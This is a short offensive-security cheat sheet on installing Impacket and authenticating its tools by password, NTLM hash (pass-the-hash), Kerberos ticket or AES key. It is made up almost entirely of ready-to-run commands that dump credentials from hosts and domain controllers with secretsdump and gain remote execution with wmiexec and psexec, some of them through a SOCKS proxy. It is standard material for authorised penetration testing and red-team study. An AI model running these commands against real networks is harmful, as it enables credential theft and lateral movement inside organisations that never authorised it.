# 07.07 Impacket Installation Auth Patterns

> Authenticate Impacket tools via password, NTLM hash (`-hashes`), Kerberos ticket (`-k`), or AES key (`-aesKey`) interchangeably.

## Overview

Impacket is a collection of Python scripts for working with network protocols. All tools share common auth patterns: password, NTLM hash, Kerberos ticket, or AES key.

## Steps

- Install latest from GitHub or use Kali wrappers (impacket-<toolname>)
- Auth: user:pass, -hashes LMHASH:NTHASH (use :NTHASH for PTH), -k (Kerberos), -aesKey
- FQDN required for Kerberos; use /etc/hosts or -dc-ip to resolve
- Proxy through SOCKS5: prepend proxychains4 to any command
- KRB5CCNAME env var selects which ccache file to use
- Use -debug flag for verbose output when troubleshooting

## Commands

### Install from git

```bash
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .
# or isolated
pipx install impacket
```

### Password auth pattern

```bash
impacket-secretsdump DOMAIN/user:'P@ss'@TARGET_IP
impacket-wmiexec DOMAIN/user:'P@ss'@TARGET_IP
```

### Pass-the-Hash pattern

```bash
impacket-secretsdump -hashes :NTLMhash DOMAIN/user@TARGET_IP
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NThash DOMAIN/user@TARGET
```

### Kerberos ticket auth

```bash
export KRB5CCNAME=/tmp/user.ccache
impacket-wmiexec -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL
impacket-secretsdump -k -no-pass DOMAIN/user@DC01.DOMAIN.LOCAL
```

### AES key auth

```bash
impacket-getTGT DOMAIN/user -aesKey <AES256_KEY> -dc-ip DC_IP
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass DOMAIN/user@TARGET.DOMAIN
```

### Proxy through SOCKS5

```bash
proxychains4 impacket-secretsdump DOMAIN/user:pass@TARGET_IP
proxychains4 impacket-wmiexec -hashes :NThash DOMAIN/user@TARGET_IP
```
